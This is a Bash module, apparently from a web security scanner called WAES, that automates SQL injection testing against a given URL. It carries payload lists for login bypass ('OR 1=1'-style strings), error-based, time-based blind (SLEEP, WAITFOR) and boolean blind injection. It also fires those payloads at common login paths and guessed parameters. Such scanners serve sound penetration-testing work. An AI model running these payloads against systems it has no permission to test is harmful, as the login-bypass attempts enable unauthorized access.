#!/usr/bin/env bash
#==============================================================================
# WAES SQL Injection Testing Module
# Automated SQL injection vulnerability detection
#==============================================================================

SCRIPT_DIR="${SCRIPT_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"

# Source dependencies
source "${SCRIPT_DIR}/lib/colors.sh" 2>/dev/null || {
    print_info() { echo "[*] $*"; }
    print_success() { echo "[+] $*"; }
    print_error() { echo "[!] $*" >&2; }
    print_warn() { echo "[~] $*"; }
    print_running() { echo "[>] $*"; }
}

#==============================================================================
# PAYLOAD LIBRARIES
#==============================================================================

# Authentication bypass payloads
declare -a SQLI_AUTH_BYPASS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "' OR '1'='1'/*"
    "admin'--"
    "admin'/*"
    "' OR 1=1--"
    "' OR 1=1#"
    "') OR ('1'='1"
    "') OR ('1'='1'--"
    "1' OR '1'='1"
    "' OR ''='"
    "' OR 'x'='x"
    "' AND 1=0 UNION SELECT 1,2,3--"
)

# Error-based detection payloads
declare -a SQLI_ERROR_BASED=(
    "'"
    "''"
    "\"" 
    "\""
    "1'"
    "1\""
    "1 AND 1=1"
    "1 AND 1=2"
    "1' AND '1'='1"
    "1' AND '1'='2"
    "1 UNION SELECT NULL"
    "1 UNION SELECT NULL,NULL"
    "1 UNION SELECT NULL,NULL,NULL"
)

# Time-based blind payloads
declare -a SQLI_BLIND_TIME=(
    "1' AND SLEEP(3)--"
    "1' AND SLEEP(3)#"
    "1; WAITFOR DELAY '0:0:3'--"
    "1' AND BENCHMARK(10000000,SHA1('test'))--"
    "1' OR SLEEP(3)--"
    "1' AND (SELECT SLEEP(3))--"
    "1'; SELECT SLEEP(3);--"
)

# Boolean-based blind payloads
declare -a SQLI_BLIND_BOOLEAN=(
    "1 AND 1=1"
    "1 AND 1=2"
    "1' AND '1'='1"
    "1' AND '1'='2"
    "1 OR 1=1"
    "1 OR 1=2"
)

# SQL error signatures
declare -a SQL_ERROR_SIGNATURES=(
    "SQL syntax"
    "mysql_fetch"
    "mysqli_"
    "ORA-"
    "Oracle error"
    "ODBC"
    "Microsoft SQL"
    "PostgreSQL"
    "sqlite3"
    "SQLite"
    "syntax error"
    "unclosed quotation"
    "quoted string not properly terminated"
    "Invalid query"
    "Database error"
    "DB Error"
    "Warning: mysql"
    "Warning: pg_"
    "Warning: sqlite"
)

#==============================================================================
# SQLI TESTING FUNCTIONS
#==============================================================================

# Test for SQL error disclosure
test_error_based() {
    local url="$1"
    local param="$2"
    local output_file="$3"
    local found=0
    
    print_running "  Testing error-based SQLi on parameter: $param"
    
    for payload in "${SQLI_ERROR_BASED[@]}"; do
        local encoded_payload
        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'"'"'/%27/g; s/"/%22/g')
        
        local test_url="${url}${param}=${encoded_payload}"
        local response
        response=$(curl -sk -L --max-time 10 "$test_url" 2>/dev/null)
        
        # Check for SQL error signatures
        for sig in "${SQL_ERROR_SIGNATURES[@]}"; do
            if echo "$response" | grep -qi "$sig"; then
                echo "[SQLI] Error-based SQLi detected on $param with: $payload" >> "$output_file"
                echo "       Error signature: $sig" >> "$output_file"
                print_warn "    → Found: SQL error with payload: $payload"
                ((found++))
                break 2
            fi
        done
    done
    
    return $found
}

# Test authentication bypass
test_auth_bypass() {
    local url="$1"
    local output_file="$2"
    local found=0
    
    print_running "  Testing authentication bypass..."
    
    # Common login endpoints
    local login_paths=("login" "signin" "auth" "admin/login" "user/login" "api/login" "account/login")
    
    for path in "${login_paths[@]}"; do
        local login_url="${url}/${path}"
        local response_code
        response_code=$(curl -sk -o /dev/null -w "%{http_code}" "$login_url" 2>/dev/null)
        
        if [[ "$response_code" == "200" ]] || [[ "$response_code" == "302" ]]; then
            print_info "    Found login form at: /$path"
            
            # Test each auth bypass payload
            for payload in "${SQLI_AUTH_BYPASS[@]}"; do
                local response
                response=$(curl -sk -L -X POST "$login_url" \
                    -d "username=${payload}&password=test" \
                    --max-time 10 2>/dev/null)
                
                # Check for successful bypass indicators
                if echo "$response" | grep -qiE "dashboard|welcome|logout|profile|admin|success"; then
                    echo "[SQLI] Auth bypass successful at $login_url" >> "$output_file"
                    echo "       Payload: $payload" >> "$output_file"
                    print_warn "    → Found: Auth bypass with: $payload"
                    ((found++))
                    break
                fi
            done
        fi
    done
    
    return $found
}

# Test time-based blind SQLi
test_blind_time() {
    local url="$1"
    local param="$2"
    local output_file="$3"
    local found=0
    local baseline_time
    
    print_running "  Testing time-based blind SQLi on parameter: $param"
    
    # Get baseline response time
    baseline_time=$(curl -sk -o /dev/null -w "%{time_total}" "${url}${param}=1" 2>/dev/null)
    baseline_time=$(echo "$baseline_time" | cut -d'.' -f1)
    baseline_time=${baseline_time:-0}
    
    for payload in "${SQLI_BLIND_TIME[@]}"; do
        local encoded_payload
        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'"'"'/%27/g')
        
        local test_url="${url}${param}=${encoded_payload}"
        local response_time
        response_time=$(curl -sk -o /dev/null -w "%{time_total}" "$test_url" --max-time 15 2>/dev/null)
        response_time=$(echo "$response_time" | cut -d'.' -f1)
        response_time=${response_time:-0}
        
        # Check if response was delayed (3+ seconds more than baseline)
        if [[ $response_time -ge $((baseline_time + 3)) ]]; then
            echo "[SQLI] Time-based blind SQLi detected on $param" >> "$output_file"
            echo "       Payload: $payload" >> "$output_file"
            echo "       Baseline: ${baseline_time}s, Response: ${response_time}s" >> "$output_file"
            print_warn "    → Found: Time-based blind SQLi (delay: ${response_time}s)"
            ((found++))
            break
        fi
    done
    
    return $found
}

# Test boolean-based blind SQLi
test_blind_boolean() {
    local url="$1"
    local param="$2"
    local output_file="$3"
    local found=0
    
    print_running "  Testing boolean-based blind SQLi on parameter: $param"
    
    # Get baseline responses
    local true_response false_response
    true_response=$(curl -sk -L "${url}${param}=1" --max-time 10 2>/dev/null | wc -c)
    false_response=$(curl -sk -L "${url}${param}=0" --max-time 10 2>/dev/null | wc -c)
    
    # Test boolean payloads
    local and_true and_false
    and_true=$(curl -sk -L "${url}${param}=1%20AND%201=1" --max-time 10 2>/dev/null | wc -c)
    and_false=$(curl -sk -L "${url}${param}=1%20AND%201=2" --max-time 10 2>/dev/null | wc -c)
    
    # Check for different responses (potential blind SQLi)
    if [[ $and_true -ne $and_false ]] && [[ $and_true -eq $true_response ]]; then
        echo "[SQLI] Boolean-based blind SQLi detected on $param" >> "$output_file"
        echo "       True condition matches baseline, false differs" >> "$output_file"
        print_warn "    → Found: Boolean-based blind SQLi"
        ((found++))
    fi
    
    return $found
}

# Discover injectable parameters
discover_parameters() {
    local url="$1"
    local output_file="$2"
    
    print_running "  Discovering parameters..."
    
    # Common injectable parameters
    local common_params=("id" "user" "name" "search" "query" "q" "page" "category" 
                         "item" "product" "article" "post" "comment" "file" "view"
                         "action" "type" "sort" "order" "filter" "lang" "year" "month")
    
    local found_params=()
    
    for param in "${common_params[@]}"; do
        local test_url="${url}?${param}=1"
        local response_code
        response_code=$(curl -sk -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)
        
        if [[ "$response_code" == "200" ]]; then
            found_params+=("$param")
        fi
    done
    
    if [[ ${#found_params[@]} -gt 0 ]]; then
        echo "[+] Discovered parameters: ${found_params[*]}" >> "$output_file"
        print_info "    Found ${#found_params[@]} potentially injectable parameters"
    fi
    
    echo "${found_params[@]}"
}

#==============================================================================
# MAIN SQLI SCAN FUNCTION
#==============================================================================

scan_sqli() {
    local target_url="$1"
    local report_dir="${2:-.}"
    
    local domain
    domain=$(echo "$target_url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    local output_file="${report_dir}/${domain}_sqli_scan.txt"
    
    print_info "Starting SQL Injection scan for: $target_url"
    echo ""
    
    {
        echo "=== SQL Injection Vulnerability Scan ==="
        echo "Target: $target_url"
        echo "Scan Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
    } > "$output_file"
    
    local total_found=0
    
    # Test authentication bypass
    test_auth_bypass "$target_url" "$output_file"
    total_found=$((total_found + $?))
    
    # Discover and test parameters
    local params
    params=$(discover_parameters "$target_url" "$output_file")
    
    if [[ -n "$params" ]]; then
        for param in $params; do
            test_error_based "${target_url}?" "$param" "$output_file"
            total_found=$((total_found + $?))
            
            test_blind_boolean "${target_url}?" "$param" "$output_file"
            total_found=$((total_found + $?))
            
            test_blind_time "${target_url}?" "$param" "$output_file"
            total_found=$((total_found + $?))
        done
    fi
    
    # Summary
    {
        echo ""
        echo "=== Scan Summary ==="
        echo "Total potential vulnerabilities found: $total_found"
    } >> "$output_file"
    
    if [[ $total_found -gt 0 ]]; then
        print_warn "Found $total_found potential SQL injection vulnerabilities"
    else
        print_success "No obvious SQL injection vulnerabilities detected"
    fi
    
    print_success "SQL injection scan complete: $output_file"
}

#==============================================================================
# CLI INTERFACE
#==============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 1 ]]; then
        cat <<EOF
Usage: $0 <target_url> [report_dir]

SQL Injection Testing Module
Tests for authentication bypass, error-based, and blind SQL injection.

Examples:
    $0 http://example.com/
    $0 http://example.com ./reports
EOF
        exit 1
    fi
    
    scan_sqli "$@"
fi
